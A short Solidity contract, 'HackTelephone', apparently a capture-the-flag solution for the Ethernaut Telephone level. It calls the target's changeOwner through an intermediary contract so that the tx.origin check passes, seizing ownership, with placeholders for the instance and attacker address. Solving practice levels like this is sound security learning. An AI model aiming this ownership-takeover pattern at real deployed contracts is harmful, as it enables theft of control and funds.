pragma solidity 0.5.6;

interface ETHERNAUTS {
    function changeOwner(address _owner) external;
}

contract HackTelephone {
    ETHERNAUTS public ethernauts;

    constructor() public {
       ethernauts  = ETHERNAUTS(your_contract_instance);
    }
    
    function claimOwnership() public {
        address myAddress = your_address;
        ethernauts.changeOwner(myAddress);
    }
}